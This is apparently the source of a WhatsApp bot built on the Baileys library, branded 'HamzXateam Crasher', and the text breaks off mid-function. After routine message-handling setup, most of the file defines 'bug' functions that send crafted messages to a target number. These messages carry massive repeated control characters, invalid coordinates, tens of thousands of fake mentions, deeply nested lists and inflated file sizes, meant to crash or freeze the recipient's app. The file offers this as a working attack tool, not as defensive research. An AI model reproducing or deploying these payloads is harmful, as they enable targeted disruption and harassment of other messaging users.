require('./system/settings');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const crypto = require('crypto');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const jsobfus = require('javascript-obfuscator');
const { deobfuscate } = require('obfuscator-io-deobfuscator');
const JsConfuser = require('js-confuser')
const { spawn, exec, execSync } = require('child_process');
const remini = require('./system/lib/memeks');
let accces = JSON.parse(fs.readFileSync('./system/database/access.json'));

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, downloadAndSaveMediaMessage, getContentType, prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = hamz = async (hamz, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? hamz.user.id.split(":")[0] || hamz.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() 
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./system/database/owner.json'));
const botNumber = await hamz.decodeJid(hamz.user.id);
const isBot = botNumber.includes(senderNumber)
const isOwner = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isAcces = accces.includes(sender)
/*const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();*/
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);

// Group function
const groupMetadata = isGroup ? await hamz.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./system/lib/myfunction');

const { notif3 } = require("./system/virtex/notif3")
const { xnaf } = require('./system/virtex/xnaf')
const { buttonkal } = require('./system/virtex/buttonkal')
const TDX = fs.readFileSync("./system/virtex/tdx.jpg")
// Time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ XA Team Message`));
console.log(
chalk.bgHex("#00FF00").black(
` ⾐ Tanggal: ${new Date().toLocaleString()} \n` +
` ⾐ Pesan: ${m.body || m.mtype} \n` +
` ⾐ Pengirim: ${m.pushName} \n` +
` ⾐ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ⾐ Grup: ${groupName} \n` +
` ⾐ GroupJid: ${m.chat}`
)
);
}
console.log();
}
//QONTED 
const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `XA Team By Hamz`,jpegThumbnail: ""}}}
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑`}}}

// Function Bug
async function crashMsgCall(hamz, target) {
  hamz.relayMessage(target, {
    viewOnceMessage: {
        message: {
            interactiveMessage: {
                header: {
                    documentMessage: {
                        url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                        fileLength: "999999999",
                        pageCount: 0x9184e729fff,
                        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                        fileName: "Fuck You",
                        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                        directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                        mediaKeyTimestamp: "1715880173",
                        contactVcard: true
                    },
                    title: "Fuck",
                    hasMediaAttachment: true
                },
                body: {
                    text: "You"
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        }
                    ]
                },
                contextInfo: {
                    quotedMessage: {
                        interactiveResponseMessage: {
                            body: { 
                                text: "Sent", 
                                format: "DEFAULT" 
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: `{
                                    "screen_2_OptIn_0": true,
                                    "screen_2_OptIn_1": true,
                                    "screen_1_Dropdown_0": "HamzDev",
                                    "screen_1_DatePicker_1": "1028995200000",
                                    "screen_1_TextInput_2": "hamz@gmail.com",
                                    "screen_1_TextInput_3": "94643116",
                                    "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(1020000)}",
                                    "screen_0_TextInput_1": "Why?",
                                    "screen_0_Dropdown_2": "001-Grimgar",
                                    "screen_0_RadioButtonsGroup_3": "0_true",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    }
}, { participant: { jid: target } }, { messageId: null });
}
// Function Bug
    const Filx = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "XA Team",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };
    
const qdocu = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"documentMessage": {
					"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
					"mimetype": "application/octet-stream",
					"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
					"fileLength": "64455",
					"pageCount": 1,
					"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
					"fileName": "⭑̤▾ 𝐠͆𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆𝐠̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆𝐠̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆𝐠̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆𝐠̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆𝐠҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ 𝐂𝐫𝐚𝐬𝐡̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺  ▾⭑̤" + "ꦾ".repeat(90000),
					"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
				}
			}
		}
const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
}

async function freezeuii(target) {
    await hamz.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `${buttonkal}.${notif3}.${xnaf}.${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: `${idsal}`, groupSubject: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function NewsletterZap(target) {
			var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
				'viewOnceMessage': {
				   'key': {
                    'remoteJid': 'status@broadcast',
                     'fromMe': false,
                      'participant': '0@s.whatsapp.net'
                },
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `${idsal}`,
							"newsletterName": `${buttonkal}`,
							"jpegThumbnail": "",
							"caption": `𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫🐉`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': target
			});
			await hamz.relayMessage(target, messageContent.message, {
				'participant': {
					'jid': target
				},
				'messageId': null
			});
		}
async function NewPayLoad(X, qdocu) {
    // Mengirim lokasi
    const locationMessage = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0,
                        },
                        hasMediaAttachment: true,
                    },
                    body: {
                        text: "⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢\0\0\0𝐈𝐭𝐬𝐌𝐞 𝐀𝐥𝐝𝐳𝐗𝐕𝐢𝐫𝐙𝐨\0\0\0⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢" + "ꦾ".repeat(120000) + "@1".repeat(250000),
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [
                            {
                                groupJid: "1@newsletter",
                                groupSubject: "⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢\0\0\0⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢\0\0\0⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢\0\0\0ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ\0\0\0ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ\0\0\0ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ\0\0\0🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477🎭@+62 831-2263-5477",
                            },
                        ],
                    },
                },
            },
        },
    };

    await hamz.relayMessage(X, locationMessage, {
        participant: { jid: X },
        messageId: null,
    });


    // Jeda 2 detik sebelum mengirim orderMessage
    await new Promise((resolve) => setTimeout(resolve, 2000));

    // Mengirim orderMessage
    const orderMessageContent = {
        orderId: "CRASHCODE9471",
        thumbnail: "",
        itemCount: 999999999,
        status: "DECLINED",
        surface: "CATALOG",
        message: "⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢\0\0\0𝐈𝐭𝐬𝐌𝐞 𝐀𝐥𝐝𝐳𝐗𝐕𝐢𝐫𝐙𝐨\0\0\0⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢" + "ꦾ".repeat(50000) + "@1".repeat(90000),
        orderTitle: "INFINITY",
        sellerJid: "1@s.whatsapp.net",
        token: "AR5rcf+zsk2VFs9+l8RFDB34fYqsUY0nQxBMAjE66D0nFQ==",
        totalAmount1000: "\u0000",
        totalCurrencyCode: "IDR",
        messageVersion: 2,
    };

    const protoMessage = proto.Message.fromObject({
        orderMessage: orderMessageContent,
    });

    const etc = generateWAMessageFromContent(X, protoMessage, {
        userJid: X,
        quoted: qdocu,
    });

    await hamz.relayMessage(X, etc.message, {
        participant: { jid: X },
        messageId: etc.key.id,
    });
    console.log("𝗠𝗢𝗧𝗨𝗣𝗔𝗧𝗟𝗨 𝐂𝐫𝐚𝐬𝐡 : 𝐀𝐜𝐭𝐢𝐯𝐞𝐭𝐞𝐝")
}
		
async function InvisiPayload(targetNumber) {
      let sections = [];

      for (let i = 0; i < 100000; i++) {
        let largeText = "";

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let msg = generateWAMessageFromContent(
        targetNumber,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [targetNumber],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: targetNumber,
                  },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                  text: "",
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                  subtitle: "Testing Immediate Force Close",
                  hasMediaAttachment: false, // No media to focus purely on data overload
                }),
                nativeFlowMessage:
                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "payment_method",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                    ],
                  }),
              }),
            },
          },
        },
        { userJid: targetNumber }
      );

      await hamz.relayMessage(targetNumber, msg.message, {
        participant: { jid: targetNumber },
        messageId: msg.key.id,
      });
    }		
async function newfreezebug(target) {
    let virus = "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫";
    await hamz.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 7777099.1,
                            degreesLongitude: -922.999999999999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ꦾꦾ󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function newvirpen(target) {
    let virus = "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫" + "ꦾ".repeat(50000);
    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@NOT BLOCKING"
    );
    let message = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964183@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫"
                    },
                    description: " @120363326274964934@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274938194@g.us", 
                            groupSubject: virus 
                        }]
                    }
                }
            }
        }
    };

    await hamz.relayMessage(target, message, { participant: { jid: target } }, { messageId: null });
}
async function TrashSpider(target, pic, Ptcp = true) {
   await hamz.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "⿻⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝄽⃟⃟⃟🇮🇩🇮🇩⿻-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞メ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: pic,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫\n" + "@6283129626211".repeat(17000),
        },
        nativeFlowMessage: {
         buttons: [{
           name: "cta_url",
           buttonParamsJson: "{ display_text: '⃟༑⌁⃰𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫ϟ〽️', url: \"https://youtube.com/HamzDEV\", merchant_url: \"https://youtube.com/HamzDEV\" }",
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}",
          },
         ],
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["6283129626211@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐂𝐫𝐚𝐬𝐡𝐞𝐫〽️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
